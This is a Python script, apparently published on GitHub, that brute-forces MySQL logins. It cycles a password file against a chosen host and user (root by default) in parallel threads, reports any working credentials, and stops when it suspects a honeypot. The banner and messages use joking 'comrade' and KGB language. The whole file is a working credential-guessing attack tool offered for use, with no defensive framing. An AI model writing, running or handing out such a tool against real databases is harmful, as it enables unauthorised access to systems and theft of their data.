#!/usr/bin/env python3
# By Aqhmal
# https://github.com/aqhmal/mysql_bruteforce

import sys
import argparse
import MySQLdb
from os import path
from time import sleep
from datetime import datetime
from threading import Thread, activeCount

status = False
allowed = True
honeypot = False
verbose = False

# Get current time in formatted form.
def curTime():
	now = datetime.now()
	return now.strftime("%d/%m/%Y %I:%M:%S %p")

# Show script banner.
def showBanner():
	print("\n\033[1;37m ██████╗ ██╗   ██╗██████╗ ███████╗ ██████╗ ██╗     ")
	print("██╔═══██╗██║   ██║██╔══██╗██╔════╝██╔═══██╗██║     ")
	print("██║   ██║██║   ██║██████╔╝███████╗██║   ██║██║     ")
	print("██║   ██║██║   ██║██╔══██╗╚════██║██║▄▄ ██║██║     ")
	print("╚██████╔╝╚██████╔╝██║  ██║███████║╚██████╔╝███████╗")
	print(" ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚══════╝ ╚══▀▀═╝ ╚══════╝")
	print("-----> \"Comrade, Your MySQL is now OurSQL\" <-----\033[1;m\n")

# Show green text.
def showSuccess(msg):
	print("\033[1;32m[{}] [+] {}\033[1;m".format(curTime(), msg))

# Show red text.
def showFailure(msg):
	print("\033[1;31m[{}] [-] {}\033[1;m".format(curTime(), msg))

# Show white text.
def showInfo(msg):
	print("\033[1;37m[{}] [*] {}\033[1;m".format(curTime(), msg))

# Check if file exists.
def file_exists(parser, file):
	if not path.exists(file):
		parser.error("Password file not found ({})".format(file))
	return [x.strip() for x in open(file)]

def connect(host, user, password, port):
	global status, allowed, honeypot, verbose
	try:
		conn = MySQLdb.connect(host=host, port=port, user=user, password=password, connect_timeout=3)
		showSuccess("Login Success! {} : {}".format(user, password))
		status = True
	except Exception as e:
		errno, message = e.args
		if errno == 2013 or errno == 2002:
			honeypot = True
		if errno == 1130:
			allowed = False
		else:
			if verbose:
				showFailure("Login failed {} : {}".format(user, password))

def exitScript():
	showInfo("Exiting OurSQL...")
	sys.exit()

def main(args):
	try:
		global status, allowed, verbose
		user = args.user
		port = args.port
		host = args.host
		verbose = args.verbose
		max_threads = args.thread
		showInfo("Targeting {}:{}".format(host, port))
		showInfo("Starting brute force")
		for password in args.passwords:
			if status:
				showSuccess("Successfully made their MySQL to OurSQL!")
				exitScript()
			if not allowed:
				showFailure("Comrade! Host {}:{} doesn't allow us to access user {}".format(host, port, user))
				exitScript()
			if honeypot:
				showFailure("Comrade! {}:{} is probably western spy trap (honeypot) !".format(host, port))
				exitScript()
			th = Thread(target=connect, args=(host, user, password, port))
			th.daemon = True
			th.start()
			while activeCount() > max_threads:
				sleep(0.001)
		while activeCount() > 1:
			sleep(0.001)
		showFailure("Sorry comrade... your password file is not stronk enuff")
		exitScript()
	except KeyboardInterrupt:
		exitScript()

if __name__ == "__main__":
	try:
		showBanner()
		desc = "MySQL Brute force script. Some says that KGB used this script during cold war."
		args = argparse.ArgumentParser(description=desc)
		args.add_argument("-p", "--pass", dest="passwords", type=lambda x: file_exists(args, x), required=True, help="The passwords file")
		args.add_argument("-H", "--host", dest="host", type=str, required=True, help="The DBMS IP or domain")
		args.add_argument("-P", "--port", dest="port", type=int, default=3306, help="The DBMS Port (Default: 3306)")
		args.add_argument("-u", "--user", dest="user", type=str, default="root", help="The DBMS username (Default: root)")
		args.add_argument("-t", "--thread", dest="thread", type=int, default=3, help="The number of threads (Defaut: 3)")
		args.add_argument("-v", "--verbose", dest="verbose", action="store_true", help="Show all login attempt message")
		args = args.parse_args()
		showInfo("Starting OurSQL")
		main(args)
	except KeyboardInterrupt:
		showInfo("Exiting script")
		sys.exit()